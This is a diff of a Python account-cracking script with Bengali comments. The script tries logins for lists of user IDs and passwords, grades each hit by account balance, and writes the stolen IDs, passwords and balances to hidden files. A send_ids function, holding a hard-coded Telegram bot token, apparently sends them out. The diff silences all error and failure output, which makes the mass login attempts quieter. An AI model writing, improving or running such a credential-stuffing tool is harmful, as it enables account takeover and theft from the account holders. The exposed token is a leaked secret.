@@ -122,7 +122,7 @@ def attempt_login(user_id, pw):
                     lvl = 'Poor'
                     ern = '1 BDT'
                 
-                # আউটপুট igx.py এর মতো - শুধু এই অংশে পরিবর্তন
+                # আউটপুট igx.py এর মতো
                 try:
                     balance_int = int(balance_str)
                     if balance_int >= 10000:
@@ -140,7 +140,7 @@ def attempt_login(user_id, pw):
                     msg = f'{BOLD}{Y} {uname} | Profile : {lvl} | Earned : {ern} {D}'
                     print(msg)
                 
-                # ফাইলে সেভ করা - আগের মতোই
+                # ফাইলে সেভ করা
                 if level == 'Normal':
                     with open('.normal.txt', 'a', encoding='utf-8') as f:
                         f.write(f'{uid} | {pw} | Balance: {balance_str} | Level: {level}\n')
@@ -152,14 +152,16 @@ def attempt_login(user_id, pw):
                 print(f'{R} [!] TURN OFF YOUR DATA FOR A WHILE (API LIMIT OVER){D}')
                 time.sleep(30)
             else:
-                print(f'{R} Login failed for {user_id}: Status {status_code}{D}')
+                # S0005 বা অন্য কোনো error code আসলে শুধু pass করব, প্রিন্ট করব না
+                # igx.py তে এই ধরনের error প্রিন্ট হতো না
+                pass
         else:
-            print(f'{R} FAILED ERROR >> {response.status}{D}')
-            time.sleep(10)
+            # HTTP error হলে শুধু pass করব, প্রিন্ট করব না
+            pass
             
     except Exception as e:
-        print(f'{R} Error for {user_id}: {e}{D}')
-        time.sleep(3)
+        # Exception হলে শুধু pass করব, প্রিন্ট করব না
+        pass
 
 def send_ids(uid, pw, balance, level, retries=3, delay=2):
     BOT_TOKEN = '7079698461:AAG1N-qrB_IWHWOW5DOFzYhdFun4kBtSEQM'
@@ -207,7 +209,8 @@ def login():
             try:
                 future.result()
             except Exception as e:
-                print(f'{R} Thread error: {e}{D}')
+                # Thread error গুলোও প্রিন্ট করব না
+                pass
 
 def switch():
     try:
